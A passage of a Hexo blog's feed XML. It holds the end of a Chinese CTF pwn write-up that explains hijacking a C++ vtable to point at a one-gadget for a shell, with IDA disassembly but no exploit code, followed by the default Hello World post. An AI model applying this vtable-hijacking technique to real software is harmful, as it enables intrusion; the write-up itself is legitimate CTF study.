title="getshell"></a>getshell</h2><p>伪造movie的虚表vtable，使其指向我们可控的内存（泄露了heap地址，将magic gadget地址写入heap中就行了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000004015A0 ; `vtable for&apos;Movie</span><br><span class="line">.rodata:00000000004015A0 _ZTV5Movie      dq 0                    ; offset to this</span><br><span class="line">.rodata:00000000004015A8                 dq offset _ZTI5Movie    ; `typeinfo for&apos;Movie</span><br><span class="line">.rodata:00000000004015B0 printf_movie    dq offset sub_4011B0    ; DATA XREF: add_movie+24↑o  //改成magic地址</span><br><span class="line">.rodata:00000000004015B8                 dq offset nullsub_2</span><br><span class="line">.rodata:00000000004015C0                 dq offset j___ZdlPv     ; operator delete(void *)</span><br><span class="line">.rodata:00000000004015C8                 align 20h</span><br><span class="line">.rodata:00000000004015E0 ; `vtable for&apos;TV</span><br><span class="line">.rodata:00000000004015E0 _ZTV2TV         dq 0                    ; offset to this</span><br><span class="line">.rodata:00000000004015E8                 dq offset _ZTI2TV       ; `typeinfo for&apos;TV</span><br><span class="line">.rodata:00000000004015F0 printf_tv       dq offset sub_4011E0    ; DATA XREF: add_tv+24↑o</span><br><span class="line">.rodata:00000000004015F8                 dq offset nullsub_1</span><br><span class="line">.rodata:0000000000401600                 dq offset j___ZdlPv_0   ; operator delete(void *)</span><br></pre></td></tr></table></figure></p><p>show的时候，list_table的开头存放这vtable的地址，vtable的开头是打印函数，如果伪造vtable的指向magic，就可以直接getshell了。</p><p>本题没有提供libc，需要通过泄露地址的后3位来查找。<br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>暂时不放</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>菜鸟乱写一通，看不懂不要喷，欢迎纠正。完成，撒花~~~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;blog已经搭了一段时间了，拖延症发作，一直没写。最近没做什么有意思的题，就写一下某CTF群的入群题解题思路。&lt;/p&gt;
&lt;h2 id=&quot;程序伪代码&quot;&gt;&lt;a href=&quot;#程序伪代码&quot; class=&quot;headerlink&quot; title=&quot;程序伪代码&quot;&gt;&lt;/a&gt;程序伪代码&lt;/h
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2018/01/16/hello-world/"/>
    <id>http://yoursite.com/2018/01/16/hello-world/</id>
    <published>2018-01-16T11:10:53.418Z</published>
    <updated>2018-01-16T11:10:53.418Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
